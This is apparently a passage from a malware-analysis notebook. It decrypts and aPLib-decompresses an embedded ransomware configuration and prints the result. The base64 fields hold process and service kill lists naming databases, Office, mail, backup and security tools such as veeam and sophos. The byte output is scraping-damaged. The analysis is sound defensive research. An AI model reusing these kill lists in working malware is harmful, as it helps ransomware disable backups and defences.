ce02ec4de3ae4c40cb9df8e969902d72c2ecacbbbcba7c9998313a624c6f14be4197dbc16e6967781f90904df0d5b416a0478e2584dca53bc2bab8a04ccff2fe1467dfdb9696888d04f0f001eff686a051d772420aabfdd0b04d1b73185d28e20f30cf908667b2e0eb30882bd8d22d27b2e5b5b96cf7d661c66d5f3f9f02a07a2490a9ff8cf0ffe0dc3626e72f2229a6dd43b2b6ed05f89da28dbb7365cb4b8245fe523256ec384cd8ae48a191369ec24c0d0b22ac4cb74e2f1b40a990f437ec2b9ea09c471afcaab2e1e66c32f4ee1400b0922bdd56fca200a5d7e563c684c70d2ec6021b0a31ad2c145311d9f24d6ad0d1175a8dcaff76c2ae51490d736ed852fcdecef3d0949b9443b370cf05aa9aa854d66a9a4916a5c1be7b358f44d20c79cd9b2b3c6d90228b9ad34075decc292d929c1b0ecaa1dd2395a660a9567bd0dab2a3cde54022a60d6bee9ee02c7a884df019793e70f53e8c99ea4c283ed52899e4d563d42447919504177b47b0e5eff2548b4e6f1f76bbe0e107ef570b24a122d4afc02691a8fcd1f8c936bd71660e7b8bcfad6c2505d4e27f2aa5f4a2412f4cd7ad02129bbd80ba35007c3425cf7c97b221dd84cc21fb5fd5db35f72dd35719a38520f138c9db0fac6679fd0c139ee0c538e57b1cdad46ceee75de5468e6a9882d1425bdba52dd450a54da0ee19c15253543499e8a6fc6112bc8571b11049f420f41747ac0cbc9bc5e86add2c8faf49399806a3a4bb6d3205f6df98a6e87c84f4012d051c7b434a71ef0907b64b81168b83670ae1f8edbdd90c27aa5221a552d8b495d23cce5e747aefb84da04b0f765be20954417fe489daca48878977975a848d464698f0a61b34f41bddaba24fcb26d328608b7eca3656732056946d690344722a80974bc60aca3e2990ea8a4794ffc77fcc1c311de5696d3cab661cb8993bd50ed2561e2d1a148b9ec15c17d13b0fb86268b9f86dc9e5cfefcf40868c08795043bdefc270566ec84874fadac418b756d4ad7bf31eb092d3a6410d47a62d65029533853339bbbc297beb83bbe8e00f307fe87f8d9bafe641527933f1ed2dd9c6fec668eb292997ec621be94c8eb3c0d2492c36aadb0842c51dc0a465a31820653066a1d38ee4a424974f4ef17994f262c62c286435b71172d790264d801756c1a0571651b3ed0059421d4d315f7fa4e7c2880dea0da45ba57b44c3f068ca4e5acbfd5355d88db8eddfc12e386818ff2e5daf98c98103cf4d92d3a30481657fcd9810c4fa37d465c0b1df73434af51851f68f7e597424693cb084c8818af802ec425bff8f4400bb5f1c639a819c9d110efe66951a6af0360be243dc93879dbb2af2f1e10fbc22d1457c53ebe14a7dd3260a866932a3364379d87e875fed72ec7935e1346bcf1289f0f8d425f3133a920f0b1d18703b3212b4405bf33393222bb816786ab560a5c9169c4cdb1e320db67c4ed8ef79daa5d23535cdd28b4059d3d37995274aacc709e5f21c2c347911d397c340d05bbbf9a10cf9fbe0b24bcc9881b0e2824c7d57644b3fdb5a2c7ced6e04baa6c2c89272e66116080324ceb096fba53c9984b3d6bb6c6089a082504aa09d06007875fe36ccc8428113232f0fb2bc9b1ffdd601598a130ecaa785a145552e1db56403c4f9d77b2fcdcff2a43c738f0fd5f3c9ffedff74f4ddc387a5411636fc4bbcbdbf0a399c141f3c17221f79ab955022ab8d77d2fbacef1576733c50adaae8d0677d3398bafe1e7e6c2503ae0b062ea4bfddb2759d2e48b5947bec6548e295d96dbab5305264f4fcf33a69f4a81eb925cfe9b20f409c68f975fa8ab83c212f51b1fc927a6623678eae7f7fa7c474ab7aa1c3208bfb7f4e22e878f1cd8b5073d56a5086429f110e5a745f032eebb56946d638b3371d9815b496ad60bf4c68237ba4da8f0ea0e52325d1bb6d91db1e1842ec7b23246b49cd443a87e2c329aaab286c8e69ee8c07e9c111949f7e17166e77c1ad6269f0b5d305b7bfa70c96083ab7fa00220350ee6ba26805abf895bee7cbe3adeffd004b5a5a59ff3de34b8042abd937f2e2228194363abe4dd6c97cc0fff89c7467466235ed3f1c4f68b58ea6823a8c2c8440de57fbefdce612a1120c96b0cff3dc6f9f349ab35974c2349f4a9699608b3e4b7b5ca9d072d88b483568cc9872d51de492346067c5ff372c0bfca978db3b689d7681d92e79eaa303f5d344ccce50bb61558faa757eacc6d67a2c535f0847589ac90fa7bf4e981ba01e274933249ae48b32396bf2a0651a1707d47970472e2af4e2ffc57bc11fd426c79dc7fa1187fd14fc66636a8a30db38c788c5098be0a06f6a7b78fd79eef3fec7ca614f47c805dfec2dde5b242a4e4668611376ad61fa824a0ca850359cd246aef18413854fab3eb571347e04a976fb4e4b5e07cdfa16e044b5934edd5f0a1995068d2d524a27e9dcfafa6c575b148d216d7cc7cd0b60b3234e4aed763e9c2b438c1835c60b9fa807fac277cd33b522a1d5f8218608d4e400e4ea8f8e54d2dc2bc9e3f0092791ca1d86cc134ac0fb129f68af4ca22bc92d0409bd938c4fad2fa3617854841bc1a5f24f55f81b5e75ab6dc96e3435bfa9298b095e0f8c28849c0ab06e71d5f9ea65c6d7a2a4606fcc7c18cbf02b8fc8416f3a7753e44d0dec90abfb6ff659e4d2275a6133e4ecb8a6e0d1b307ba4b5556e035de9938675ebf6c8274c71f07c5b09eb93d5e6daf81d532a7803c765fc22e6c74291ac5a0c677c1b9927c94474fc886a855a8c05776b4f53bc498d784407186395870684029b8f20977c811dec03625f5ef7d545fb845feb8e25b57119b0ba9e534fd271c5df54c66c0df66e1ae5cf52781cfc803d58fb339a781261f363183f5cb576e350a4599d20afeacbc37bdec9315739831cce1bdbba8623d5fe8397f352bbf2032ae980a8dd66bd96cdcc9e662aec24ff3dc9df9a3a39bb7abaf7bff34d3d39f214ef4f202c62d4eaa6e3bd8db273566a20453a10efb1fb1a118764374fc1959f0974629f4613775a6fa46a248fb1d07048d63e90ce110c5f60375b891d3a0a6cac08aa5fb781b14a813236c51ed3c51414f66cc913677f13d31528338c8c3a186fc861928134f378f0cf062a02c395444fe0cb58cc849ea90b0d5d4177cb67f4abb25095bf25d2a8aa078ff6f74502b85d647b58897c4c591e647a2a15f2d7bb139c53033475b31b55b84057b5f2f24b83bba0935b6e65d510f04e60c26a1132edb30da4a13e6a137d42e253b4833f9c3c40246d1e40cbe21ef26bbef09bace9b4155c05873f0a8a19366c1b5f1be4898442a44dbc5f5439301eab49c0d4b5be3641d9fc6b3e395c1f17e45bc287602b98c118ac16568c94e85a7399b080c0643c1f7ebc5bf072a0ce3feb3dbf2242904cc7e5f4c818d51dd74113129bfe0d819a89ef787d5f0500fefafecea65fed989a86785cf7fa5f6b07299faf73d014a5106bf28a54320031d92b3e3593003677cc02142b826987fddeb95e99d7cc7752fa2dd5bc5d27fc2284e41ab5f211c0737e8a97d72b9e6ed80ac975b84be67703a587308cdc05c192201bc37963572ea1df0a5da0207984097d17ac021097e00bc8e65667f8ffd8207944e9bfab6c3e5ef8553ce65c1f90314de51cfdfaf49344d739e918cdde88c2eaa4d3a0f75ab0f76ffc77cec21cab92a30f7787627e72ab86d2a8734093924df0766974064d3b406338d1c02bb304371195ae107236a711557ae42d28ee766c69fdee187c503608464dc7778df8e51552711ab3bbabf1aab42a989e711e930d1b672795917489afa838aa5d08f87cb51c49725bf70bfbbc2cae0db9374a403a10bf0b6f70b352673b828bc6328a51b58e96d4351b8719edcdeec9fe0294fe486b8822c88dc3d67a34920783dc8b31de38d5dfcd08ed5aa7753f28286b452f69a90d05b1e5d7ad0149cdb660adb911eadb69c18449de4230a2453cacab0a61fa90b188fa7eb8888ceb7c295738b6dfe6795f88caa7d3551cbbb8ca88832beb3a14815e652e55609a7905006a95c58cde19a0f4e70478c1855fa629386bd3db793670902a2288974ebf929acc249cb6abef103c11bfeb484eb2e959b38872ce9fe803583899fe261bf6cb3182fff7dec6c4f6a7634ee574f0243a5e69c72a6cbd6e77409d07b3955bcf2defedf27c8398623138b1f159b747ea5264e12958a8e272e0eb54f90a1db8c8f0926c4cb01cf7ecd79d1a81ae72a65261633316482293a6e0889751a97a8d79f4f641c652ae9b0d2f8dad270b956745c59638730113c8fd3ea95668fd28070e7a17dbb61be82ec297a6599560ee493bfda7994380c28b3c760cd32b891799286e54740195a3aab7b853a7f6c0f8dcc184b583aaf4f20d7a17e83356f506276cf004d6e6b1644382cf579fa1341c6cb0120c06b2973ddaeebb707ef9edffce225cff67c33aa9facdbfc9d4b71d8ffd08bfc98295df66476ad0d3b59f3734552e32831cb1e1a53769ea512fe4e0c97c83beaa011209bb164e1361f9de3ac6b1e7f7007ec94acf6e1010f162b0437fb92724a21034f03af2c25df33c7ef03cd6af8cb8dbf8787e0ec55866a19d91ca82d4be4c76ac95662719975233f3dc86524a7a86be04a4b36890f616eff51b60714cb59c95a3c3c8435ea75921935a04eb86ea3f6ba1f71c4ebc0b9e4c984fb9deff67d9ab61bfd79ff9128f95380f57006be532830225475b10ff4bf33d3ab0f1401b1539edd1da0888a8c30ab6da5d0c7eec8f33b228441e4689ae27a3625d6318076bd30bc3ac73900c9933cbe38eae2403fa6b21ec3779b6c9022cc5a7e59eaf847eb3bd0fcc9c3671c35e9ad416ea9767a83790052b80889e1cd5caebf647aec087422a74396081036853193aa0a7fa2717bf119ec814462e4b9dd12fb140f4010f45ed6c222c0a65464a843dcdb1d0ca1f216460f5435f71aa1cd7b8576a6ef49386672544efb83d97d598f889edd03e89f8c612e7d43831e39f8f8a008900e5e7046516687a5058925863cb3df7cc0dff264756ee735c6f02f9da1ef96f2da98a7c827ea7d554e645603e8ec7c1035d15e37fc3b298a38a788ec1ad86a3c2b708e56a35ca7d82edf2caf4288181d31dd1be046c358ba97b9ba43d5eb70683f2e731720ee1e5d0b5958eb163a4c910effacbef9d2d4a21024e016d36a02505a30834808dcb9d105f7ded4b692808507ad8352b02b76314c43da31b170962b0358c67ddab12aa7ba9486de79f32692389d17845591d2ff252dc7afb34ba856c10416cee35bb0bf2c4cf7c9a21855d90459ae3329107ede281c3d3559568acac06d95be1cd94adf7e4a82e7d5b44036dc5797029930ce820c8ce5e5e00cfa14b6fd18d5bb2227529fc6a8d4ec61fa1bdcaf16997c397efd6d02b3b2503d149f2ec691cba88f40dbef6e972977a0d8f9fd7a130916563f28ff2b736fde40843301b5fba887a25be0f18c2f52d1df0d8bf94c00f30ccc97247775814679a192d558e28058e46498e49342e1b36f7ecd18fec2f7c01c972ae2045d19d93333bdd93834f7126a62e0806ff874a19c2a4ac93fa37a15f55b3a9e37aa19edb2ef68702c775ac1ca7d5dfb58bb5cb4af7183ac642d6d1c6ecb73569625d23dfa38a149df1d00e93c71423ffa21042d9e04cb63b416664e20887656855a7e6ed473767b3f3ef07bef400c9a317a8cf82d86b04e107dc31599dede9387e77415be7b6cc56374fc476ea1ed4937b5b96f51632175aae5971abf53c78c56dc14eab7c2a461078b1327076bdd509b70b2166a9de7eb65406990a299f1cba977178468458fc8786715d6487bc4998bdc9de7cdbcaf54e2cad9f51c8676bb1ed484098458bcc9621103e45ebe4c0c23215b41743d1f30ecf97a3d0a1367117b126cbf0eab732660a6dda67a529e90f0178014aa46c9f48055f0938b4f67d55730d4f48dceb188a15b106f2975529819acd4296a1b71d663e19bd26ecab2f3b92ce438fe5eab7232494da8c7a6302f0fe5e48423b2bd658fb1b6c6448091db4830c4b6f717037c7a471475833b5e869405a89746bc3133524193da92a1a83752367724a6b886a61c90bbcdc4cb5e5dec89b772b3f68d6c0a547e025101ebd5422ef554d8f3cccd69e8f4c7d2bfa2de6f1676f8746c9ae8321b966cbc43fd0139b6bd573686593cba586770d6238791c360829b7f0f3febd55b41e3d7421db16ed3215aa8bda52384b91fb095e7513135011941de95774495983f99bb8870a5377bc1c4f7e6861e1e4175560fc48d2377cf1c0dc230cda9db02aefd9e20397a99e3c9b4f1b54b3055a5d38aa318487e6bbad85f1f5e00a5c6f12e7499210e0e023f76ca2445d97853673385a65495f7356bb57c3d43d52ae9482e3fa08b24d8e1db4679798e3ad90a5bb6a3c25b127d81da9628f1e2e09bdeb43722152b658a5b05efd3ce87d0619751f467e9899c8d306096145db17f24bcc94bc1138eddaf2869d0fd2f65ad8e53e051b189ad06ed011bcca6738e5b086e15e609bd76732b457879593b1e545fdc24d3d20fff48a1e8acab1950ee403359171b598b3c0944088703d61aec05ff3d621fc67577d744da5b4b91aac9eb727fd0da22d7a80847632bcf997e6cbf935a17617528952401664b6bfb1d10ced0fc888567402157418abf99ab894433ee5529683eebbe52be81b3411ed2b37299c373bf987f74c90b54881705d158cdb2659edd0b488418ba587da242e5176bb59e1975d45218ed6f080a562476d52b2739b4a10de38d9e610028116c63ac11e91be6a5d76582e4b99d6fa56291982789496422f93d0a3037003045ee307f61addc6722ae0d940c63c450d80fee9a89aa6264a60c8aba0f39f1fb6c5a2c0c12188db4edece4e29fe2359dc67c29705cb601c069577b22f373111da0e95604e3588c4a24b4da3ab13586a87f2d33e0ddba9d1b078ba7f061370e83f375d761c149d92c11d8ed73d249684638d4791fc4fa0995809336974bfc18e0ccde8de744e92b7e09963b46d51872b30609237da4c106f05944e748d8a4e0bb730cc86dfccee5e582213ac7f743571943f9e32f7b0fdae034e4cb4579f13e79e9a55c7c735e5479efc3bad8dc9b98985904180e0015674dfc585cfcd8ed6a147b08dc294f38d193343caf4b2a60f970603dc8c2b3ae7593dcea75c911dd9f04f0a7f3c5bf10c02876db716c06aca9c9ae9646895401346427bd5e2e38ae871f2e790483ee02f3493d57e5f9f64a478536e597486d792e27762fd30e1648a024bd6e131ecd9219d98f93653b3e49eb67fe4393e11ceb59f12675d75f5669c65b52397384e3cfc8e07e4ac0d2fd4d46c79b8c52a97581e95995d3a4ed6c3b24a82975555f149c97e8b5c921e40d5304bbd19d52b6a46821e8be4b74d2aae0cdb8d023346d6f6ca5a22f1e0ef09dad7c4ca0d82a5f4631d993658c4c46b7614d43e747432db7f69f0b294538dfa0ac92644a22ada7861bc0cb5a147d26f3aaad4db5eae71f95e6d8a298a6f7ccc59a2b1535d1464edc64ddad6feddad8d013ce51110d4d4a6398ed62af5ea487c366bdbcda201d5ed5cdf046f9f26e4ec876fed9e281757af73a359c2856068eb43a3425e3b40b73f6f3c12d0141e5ffba732ef7bedc951192e905a72da09e84102053adaff275a51e6ef39b5f9892cb7b01911b9b15d6f5d09fd0040b25a92c571f83a395771f739ec87ae17b36e05436fb4e6dd92d065fdb074e95d6c008a3590ce19e2916c15cb94426cc139e6971063b9d82bc0e93f9e253cd2782ccbc0b81e48d25342f6bc4cad877a9c7f886532f4a0f34de7cc976332d6d89f9fc9a6875bbfddb8002c69dda278f7dc8fc748d2c7a7cf94f35f022796ee78af6314a6f7d86208d61f0a03fdaf61cdd90ca5a8d3580b274a967ec2869b28386a843a4293ffc21f5f798ce5bc194cc2031232cfcdb5ad92c7fc764d224416dec241f51ceac4e05949a1338136163eefdbdd5ef0758bde97c881f95f1f7e00272ac05de76d2290613c15cb4c851ba57518a2e49a5fb7a29655dabf380ba3636cbe6c11a9f66755cdf1256ee0d973d05e1a9c53ed6e6c606bef584104ff6793bf98a926c7b2766f50960642e70a8ca09c15b6f727e2a327ac2d5b3494aca8449f2399eea11bad9320621f26378cea654fbee236194253e11721ea976c79c825f7c263956a610d0e13c96f9c77872c8c29a67095f1d6046183e2118101ccb9b0359cbf05b54316c6766d0b21da7ca3a4afed3165fe02816a0dd3355283cd39fbf78316e140ec3470f3d4f75b63fdf3a6050e6cf9376c205297ed310926d836d68f5a9418d7beca73c5427839f68be63664e2a41b9fe021891715351a44a3aa64798a08c90cd81b674afd67dbf540cb17dd1005aa47dcf7459ccd1fa4d7c6bccb927cb6899f6e6bd3a57bea9ae362ff1f9999ef56b9ab205adb713cd119290fc679b7c4fb46599e17c6e7761dcefed6077b34cbcbc3bd3bafcd1d0dd71bcbb65bf65f555a7f4c8cbcd42b8df70ea268f5ade5daa21c186c0e87e1fa2723703f1bce5863f582477dfa8e143df266c6aa7035b3ad644eb0c6191979b6eae989c886dbdf0b8585c57d8d6943dcd641c9a8edd99bdf4374837119d5391b831b5e6c3e6a3a44339e656ca994e54c2322aa187264f59817617778db8664c4356e20f1e3a521f0a983d5e4c13b6acbe043132b40d4cf6ad9753fd6bf3a3a80db30b01de3011958c4903d18f0b21936c7439b4f82997c98dc87b81280514993cf230a473cbf4dc65d8db58ff75ca714279891076d010b3335d60ba232eb47676d428d2da4b3ecd4918f0c00669d32720b776969267e2f0ba325e1c111d4e8254e3905df28515c85997c817ac6ee5108125dc5d9e855b06a2c9faca179c19c31c3bd6d8d30a3fdeeb774105fa3491328e2be8f09c5b83a8f3934ee813a6396734852004458676154d90acad7e40d56033b6d9933533424b984e616a63e5bcde619d3dca99912b98275c911de045ff2bc11a7385e1181e82be170d319742e691f05b1ec52007712e1eb09a309b2c086486191af2b51e657c12bfa2bb330d9fdcfbee241ad5d33e67c7293e0e3f26f5da6af2685e523102f620ac0603c5dad8d356e43bdaeadc7ddf11cc27196e51879cb4c45ac9a8002c3d2e86048874bf809e5f0f8fd84f4f1049e55f3c5fc8a88f04868f9f0a3abb91fdfa8e1ae5af1c8c700d50a6b56cd54dad46d6e923f4115ec27280e88a071e9f6fe4f787a3806c26f7a62acc06bacced324f1a5e19e1fe42e986a41ce1bfb3067f8a1bef43498762ba1efb8f94dbd4128d86571d405d834531b33356177553a28ce7293d9d0b62756e6d17d2a818e9cd0684a33ee321081a01d175bf4a628397ae3385c6508ebb6fd4f55c4abde59f69e97f7a95e98b700e1abef6aeeade2a996bb412e3f63a165cc9a925ec3033ee44a22e3a3272da1ff220473a889d6915a6e28086e63897e91cf4556f50cfb26fc7cc7f7b5ba9f55655eae2ae8864737d85b900880eb6b68755ecf473150844cc2d2e2edf2146c343f76fdb8fc597fa14b65da78e0a13e29c73a3a4cf5d87c695b9a05c4def2ccb325924550050f4b580fd6b92653d53b7abcf0c5e5e1bd205a28b4f0b9bde7f0d325e2c4de5ad01ee404825c18826ba94e4034645d52a3177845cea54175ed3c88fb39094e62cc1760d0490b2542ba90b4c1aad284bf47d992d95a7e55918bb358ad095915e70e9fd0b5366882df4efdb959217e1c12f862849c4cc2c7297f407c81b54d4c75273f7a5882235edff148df1de59b9e48ba79ecd80329e6d6edef3dea058ca4c2a28fec0082f6800333d1aeae40b691e71c5c20e5123819830f15c8494b098ea7afe6eaf78a173b79f0b538d09f0913f7056be582bbabbd7a7cfa8840f9166228c883ee8d65a72867e82187281d5753e810fba20970d7eb0401586599034b66729eda236c76f1b05cb1033b7f7043757c00b6b24f78032019d0b936f13f762d5710835a4c4fb6e696b84e4b2744dfaec59367b8eec0e75da7aee53addecb19aedfdd4d12834c6ca3c490cb7b6f584f62bd17a41ca1acbafcad212c64c36f5692a4b855dea9bdaa9cdd1550adaf2de38200f6bcf741fd1ea50f76175d3b69aa6269a73c6c28a0bf317601f9b295114a153f2fe0804ec3de3748953c9903c0fac308dc88144b916a1d49b80f01a6fbeef845108db83bc2f89e2fafe0695a177c738d7a7523e3884e5285ab637a8ec816d053669dcd0994cbcaf2e4de556d84d0742e6a254e32faf354317d2525aa34fc07dd4001fb21e55ff2a8763b21cde52895e7891419fad8f99cc81820c1144affa41199e72c24ae32b45e9f00ed9e03cb659100ef8e309c1dbab012acc7fae34eeb29164b547d552d54a8529b3bc95e27a942defb47d23c93f3508f8fb3f7cafd8aa87a1b566037b86724701407cf8b9a8cd107f496f84d8a9ea00958793542aa9bc68ecefb9b1d911d3968935500420ae06d3634c633ea333aca35547fbe3a95c0293336b97c01d7e45438083243aba6faa7c4046944cad00eef1c25efca4454d5d3b379da20b29d08bd043d47eb09af8475c7b67064fed73bc761654b043e68d8aa7419960af91efd935afa15e6eba3d5856b23e4c16e05267e2aad03ed154d0c9595aa5b8ccc98ca94cbeea55d2a1f167e1be44a82237299b75cb68da88c41fbe823b382f75bcfb20a8ab2cd7685b93d46a833536b880a998184c86d38cf2c15ee460105494216e362e7c21f11de0d7cb0fd0d4c8ebf36c3f946f4163bd474b601ad4eb2dccca816a5d73e2386b702e61bfe849f7990a2f55c1f57684effed30609987cc3e85aa4ac936bf3f244c9185f8a3dc66cfa94c330ab85ee8fba257622abed6d34029af89d87e9bb4a662d0319468b5efccc26cfb58fbf3833eb25646974f18cc44ad69e1cb122680fa608b32888a73a3164e65de3bd8a390ba244e805cf0402ec2a29e22d71c5db2b9d9d1a18dc858b637bd99d464fafb845e09e94ae15744fcedd0705bdae41f0b84a366def96b95a323b905a7bd7113d6c420ed41b4605335127873d52587be39d0feee0554531428e18935ce484c2228e4321cc379a557e94776d725f72fb8834e1e66b3e608e0da9a895e6986a6cf892dbb3ef75dad5c0266b3b29dc4c5f7e36b4f7cebf118de14e9b92362fec3ad777cc659b0e0f59ec9a6247d227db3d173ec6372f9d10afb177a8a080e86882f66464f3dabb465ae6cd91c635e6c1e749acc665dc6caaf719f3ad2f0d73d046871f54a6b0c78c54bc73f9d33ac5a6fd5e6bcc74893f5281d870eee61afe582885196e3f135918d9c8974e45a43a561a9f457f61b619518348c09fe3902d53240050c2baa4d05cf1c2a1242f67de359a30ce2fae860f19d2308c0f7c78abffe73aba265ab66df4aefd326f7ce2a8b58aa02abb2cfb37fde21aca2418f5d4edcfd5bd17f6657c51acb5c8a069345247b38430ca451488a32bbbccec4dcc34039ad3c120faa527b7e16e3ce83407fc0cd9d9d4dda9f931392d5fb7dfc12484b2437ebeb3a3f8121183384e388d652a8220fc8560353aac2c5802dad6668bc8992e9953118fde1762507bc7305bbcc4a90d070b4b3b34bc47cd2e318d478007f27e0baeb93dd59be3217deb48603c7b646c00a62fd906d437cf224a916304a92634b7a31b213621d523f8828b7a243fb8351ce5052af2c708a6c646665b334a49e4b8940146238cb9ba43879081744d4abde113f6b0c85eb17d2348ec8c0eeafb518d9ce3aa2a6926efb0e0322becf43bb50fc80e826e16da40fc159316bb4f944bf8e0b6ab9d4a96d4338880064c03afdff2e66884c16c08a4e46d193e51d78f6c1aaa11c4fef4c41a1c1b494b28180ec4370a04e0ba35c6f6d53d102d7803f9c3b25575586d18601ca4da7c2137a57fca90ec042e66a8989060a79910359d39a267acede5e6b967bf35902cb0679d8a0c33f7718f10365a7462ba5b7ad77e98eb47554ee8987873b82c828f28e1f52955e4d4f4145b92e8e732913558398a783d9154875517dc2fc9ed17f7ba8785b9f49236f4fe6076210eab75936cd07fca1c6a14019d6542bdb25640d6224c09ce300fc24aa1d5aafdc5a98400f2077f67194bfd16d6b860a7cece51bc692a7e26e93281cc7bb396b5e308df3696358cbd5a5171d1a4beabf2a2f4f605251d0aba806e38b675de6b1e1cb81e9890b5a68e26da24dd577ee372fc1227718394bad9653e4f352bf9a8a34f10603b486f21baacf1d026967fa24c4ace3564089245091a0e5d31771451a094ba6e7f458bc24af5cc46f73275cc355abaacf3ab11ee179d86c9f63f63199053258b860f619c3158151c5a420c0dc392bd0313a1feaeb4395732077dffc56311c93e897c9b09b618c3ef0cadb78e65626bfb019edce9d4087ca2a7e429f27c48e65d03ba05aa14c3793721e2182dc829252ab8305d0b6bb8b120e7aadc0f195f2ff14e80490b0361f71dccbd23b7443f46b16700faae6abc20f1ca5c05381b4ad839fdead7d0ddabe629886ecea13c2ca2d010830ff3ef63a9bb8217b5a96e3fdddebd84b6cad40d5362856df5e20b65f3d08944b55b82105a1357921ffb50244904627f0d5c7a79bfdb567b230821db9591bf8fbd5933148afd81be77f669e5455ba3b9d7f7486e5d939b1203f76fca6b6b049f10d8efd686b48e3350ffdb4705fb617cdcbe6e9d0ee5696a26a6d751a0f9518df61fea1c227543ebb4483b89601a6d4d53f7c9e4ba63e2b262723a389569fb00640dbec7d0fe1bc29836090b6119b767a77056baf80de1666b14e0c1cfd9024544ad0b31556abde6b4fc51a2787ec7fc9fddbb5308d286e658684f405ddb18677a7a4fb7784daed639d101e481588d976314cb4cd2a71300c04af56ced01cd6b5a12a0be7e13f7e4c4eb14c1c544d090eab994e277bda9f513cae8c85777ed6fc6ef614aa33467dbeeefe92141eca024a9cdee8e03876fb5f7bfa191146c8b5d555a04573ae0075502b9fa31a4fd696f5dee5a00a1a3478618b5ed92a480cf4fed3fe3e0bf3e7b0b3d012254080c3152b10f8b06fd1bb881a2813ea967612285dc36bfef0efc271e1de814b39bb8ce54ff4e78020b13df173fa20e21a8509de89830f2c477f1ee3dc0203cde8c7a5af5228f8e002ce1c7e60b4e21b2e47cbb4a8c98dc80bd87596b1ac3739d16380fcaca80bc8d689dc1b5dc41e397c812925af9c322eeb5a5fb879cd48430439d29dd55af1357eaf816727d827b3922eff92011cf085ed8105e2559852e7e7c778c2b716a2335c14cd210d7ab7884b161e0e89ab9679b5c9a01764989ad61bb92f5bdb149ec76afb288e5109a4b6a9b189f8b217da91d444571f6ad801188e0ce94f1f897211707e36672d7c45682aaf96c472d23fb5481a4ac220a4e08c649e693d87eac8bb65548f062c50fb1ee910755cd7afbea1a7c53f52523b8454134993da19b5a66e9f3d300319055df68840d9bcd11dcf663e1ae3e4529eedbfe917e175fdb0fd1354f0344e872c3144fe56a13b47c71ffaa4726cae97ce275fa375d2099212dddb35b746fe0ad881ac0d321f0d2dcf26cc87231e98162e2b36bac9ec0e73fcd36536c5d21f04b8ec99efad12980b03ba0bba1eed02e76d52fb2ddf297eabd3c0192ad6696ef04a63bb5246df2c79fc4028e50e884a9a5fd164b573cff971622d83c1973614e97aff12d957cb89f981e43adabecf5daed2d9421978a4cca7ed39c9e2aa51f6c6f7bce935946583d286046efa999f28957525d6364259f18a038&#39;) seed = struct.unpack(&#39;&lt;Q&#39;, config_data[:8])[0] data_size = struct.unpack(&#39;&lt;I&#39;,config_data[8:12])[0] enc_data = config_data[12:12+data_size] ptxt_data = aplib_decompress(decrypt(enc_data, seed)) ptxt_data . b&#39; xb3 x0c x86&#34; xdbS xffY] xc0Vm( xcd xb9 xec xcd x1e xe6 xaf xb4 xa6 xc5z xa1 x02 xa7 xa9)W x8c xfb xb5AV xc4 xf4 x98 x06 x93 xe0D xa0 x04; xb6 x80* x8b x13 xdd xfb7 xb2 x84K xa3 xadS x94 x8b x0egit x84 xcb x1f xe2 x02 x06 xe4D tY x04 xcc x91 xfa xe53] xa7 xe8 xb8Os x13 xd0x xa9ZQ xbaLJV x02 x93^A xb6 xef%$]H x8f xa7 x7ftE xa2XP% xafgC x1b xf7~ xbc:L xa4 x08r x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x01 x01 x01 x00 x01 x01 x01 x01 x01 x01 x01 x01 x01 x00 x01 x01 x01 x01 x00 x00 x00 x01 x00 x00( x00 x00 x00 xa9 x00 x00 x00 xea x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 x00 xfb x01 x00 x00 xd0 x04 x00 x00 x00 x00 x00 x00 xc5 x05 x00 x00 x02 x06 x00 x00LSEKA82B8oz1eHAmNX5oJtdsQuNYac7Gp9HypsA7puE4C8tS3bjK3E5OADaVZQirlON1Lq6OAa7UJUtMNXnwB3X5ZmuSOOq3lOZmU5tYG817Ot5cO2IiurM3Ou8AAAAA x00FarMhpsJBzmWrgzwVqvI/FKi0oIA7GuEN1mX2/WmOsLkV6qFNariy9H3zsgAAAAA x00AA6wZwAZsMWAG0jFQBigx0AacMdAGBDJQBsgycAbaMkAHGDJQB2Qyf7L/KHxlLpKMZbiSnGX4mQAG2DLgBywywAeKM0AG4DTwBhg1YCrnsnAGHjVwBiY1QAZwNUAGTDbgBtY28AbIN0AHAjdwBwY3cAcgN3bt2tKwByo3QAbmN83eMpMwBjA4YAcMOPAHIjhwBto5wAdgOfAGJDpABqY6QAcYOlAHpjpepsuzZPFFq8AHMDxwNhe4UAZyNkAHQjTwBxI3QAZEOMAAAAA x00cwBxAGwAAABvAHIAYQBjAGwAZQAAAG8AYwBzAHMAZAAAAGQAYgBzAG4AbQBwAAAAcwB5AG4AYwB0AGkAbQBlAAAAYQBnAG4AdABzAHYAYwAAAGkAcwBxAGwAcABsAHUAcwBzAHYAYwAAAHgAZgBzAHMAdgBjAGMAbwBuAAAAbQB5AGQAZQBzAGsAdABvAHAAcwBlAHIAdgBpAGMAZQAAAG8AYwBhAHUAdABvAHUAcABkAHMAAABlAG4AYwBzAHYAYwAAAGYAaQByAGUAZgBvAHgAAAB0AGIAaQByAGQAYwBvAG4AZgBpAGcAAABtAHkAZABlAHMAawB0AG8AcABxAG8AcwAAAG8AYwBvAG0AbQAAAGQAYgBlAG4AZwA1ADAAAABzAHEAYgBjAG8AcgBlAHMAZQByAHYAaQBjAGUAAABlAHgAYwBlAGwAAABpAG4AZgBvAHAAYQB0AGgAAABtAHMAYQBjAGMAZQBzAHMAAABtAHMAcAB1AGIAAABvAG4AZQBuAG8AdABlAAAAbwB1AHQAbABvAG8AawAAAHAAbwB3AGUAcgBwAG4AdAAAAHMAdABlAGEAbQAAAHQAaABlAGIAYQB0AAAAdABoAHUAbgBkAGUAcgBiAGkAcgBkAAAAdgBpAHMAaQBvAAAAdwBpAG4AdwBvAHIAZAAAAHcAbwByAGQAcABhAGQAAABuAG8AdABlAHAAYQBkAAAAAAA= x00dgBzAHMAAABzAHEAbAAAAHMAdgBjACQAAABtAGUAbQB0AGEAcwAAAG0AZQBwAG8AYwBzAAAAbQBzAGUAeABjAGgAYQBuAGcAZQAAAHMAbwBwAGgAbwBzAAAAdgBlAGUAYQBtAAAAYgBhAGMAawB1AHAAAABHAHgAVgBzAHMAAABHAHgAQgBsAHIAAABHAHgARgBXAEQAAABHAHgAQwBWAEQAAABHAHgAQwBJAE0AZwByAAAAAAB= x009eI2aT+JI/6mK24RWVph+56xzKxJz8hUMueEk2KNA/RlvDtKIiKkUHjm6X1= 